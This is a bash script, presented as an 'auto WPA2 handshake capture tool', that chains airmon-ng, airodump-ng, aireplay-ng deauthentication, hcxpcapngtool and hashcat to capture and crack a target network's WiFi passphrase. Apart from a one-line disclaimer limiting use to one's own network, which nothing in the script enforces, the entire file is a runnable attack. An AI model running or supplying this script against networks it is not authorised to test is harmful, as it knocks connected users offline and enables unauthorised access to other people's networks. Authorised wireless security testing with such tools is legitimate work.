#!/bin/bash

# Auto Handshake Capture + Hash Conversion + Hashcat Attack
# LEGAL USE: ONLY for your own WiFi network

clear
echo "============================================"
echo "    AUTO WPA2 HANDSHAKE CAPTURE TOOL        "
echo "============================================"
echo ""

# Ask for interface
read -p "Enter your WiFi interface (example: wlan0): " IFACE

# Kill processes
echo "[*] Killing interfering processes..."
airmon-ng check kill

# Start monitor mode
echo "[*] Enabling monitor mode..."
airmon-ng start $IFACE

MON="${IFACE}mon"

# Ask BSSID and channel
read -p "Enter Target BSSID (WiFi MAC): " BSSID
read -p "Enter Channel: " CH
read -p "Enter Wordlist path: " WORDLIST

# Lock channel
echo "[*] Locking channel..."
iwconfig $MON channel $CH

# Start capture
echo "[*] Starting capture window..."
xterm -hold -e "airodump-ng -c $CH --bssid $BSSID -w capture $MON" &

sleep 5

# Deauth attack
echo "[*] Sending deauth packets to capture handshake..."
xterm -hold -e "aireplay-ng --deauth 20 -a $BSSID $MON" &

echo "[*] Waiting 15 seconds..."
sleep 15

killall airodump-ng
killall aireplay-ng

# Convert to hashcat format
echo "[*] Converting capture to hashcat format..."
hcxpcapngtool -o wifi.hc22000 capture-01.cap

# Start hashcat
echo "[*] Starting hashcat cracking..."
hashcat -m 22000 wifi.hc22000 $WORDLIST --force --status --status-timer=5

echo "============================================"
echo "PROCESS COMPLETE"
echo "============================================"
